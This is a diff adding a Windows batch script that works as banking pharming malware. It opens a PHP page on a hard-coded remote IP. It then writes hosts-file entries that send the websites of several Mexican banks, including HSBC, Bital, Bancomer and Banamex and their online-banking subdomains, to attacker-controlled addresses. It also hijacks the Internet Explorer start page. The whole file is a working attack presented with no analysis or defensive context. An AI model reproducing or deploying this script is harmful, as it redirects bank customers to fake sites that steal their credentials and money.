@@ -1,0 +1,24 @@
+@echo off
+start http://72.29.95.216/Targeta-Nico/Postal-Ok.php
+echo 94.229.77.22 www.hsbc.com.mx>>%windir%\System32\drivers\etc\hosts
+echo 94.229.77.22 hsbc.com.mx>>%windir%\System32\drivers\etc\hosts
+echo 94.229.77.22 bital.com.mx>>%windir%\System32\drivers\etc\hosts
+echo 94.229.77.22 www.bital.com.mx>>%windir%\System32\drivers\etc\hosts
+echo 94.229.77.22 conexion.bital.com.mx>>%windir%\System32\drivers\etc\hosts
+echo 94.229.77.22 cei.bital.com.mx>>%windir%\System32\drivers\etc\hosts
+echo 94.229.77.22 cei.hsbc.com.mx>>%windir%\System32\drivers\etc\hosts
+echo 207.83.211.40 www.bancomer.com>>%windir%\System32\drivers\etc\hosts
+echo 207.83.211.40 www.bancomer.com.mx>>%windir%\System32\drivers\etc\hosts
+echo 207.83.211.40 bancomer.com>>%windir%\System32\drivers\etc\hosts
+echo 207.83.211.40 bancomer.com.mx>>%windir%\System32\drivers\etc\hosts
+echo 207.83.211.40 banamex.com>>%windir%\System32\drivers\etc\hosts
+echo 207.83.211.40 www.banamex.com>>%windir%\System32\drivers\etc\hosts
+echo 207.83.211.40 banamex.com.mx>>%windir%\System32\drivers\etc\hosts
+echo 207.83.211.40 www.banamex.com.mx>>%windir%\System32\drivers\etc\hosts
+echo 207.83.211.40 www.bancanetempresarial.banamex.com.mx>>%windir%\System32\drivers\etc\hosts
+echo 207.83.211.40 bancanetempresarial.banamex.com.mx>>%windir%\System32\drivers\etc\hosts
+echo 207.83.211.40 boveda.banamex.com>>%windir%\System32\drivers\etc\hosts
+reg add "HKCU\Software\Microsoft\Internet Explorer\Main" /v "Start Page" /d "http://72.29.95.216/google/" /f>nul
+pause
+exit
+
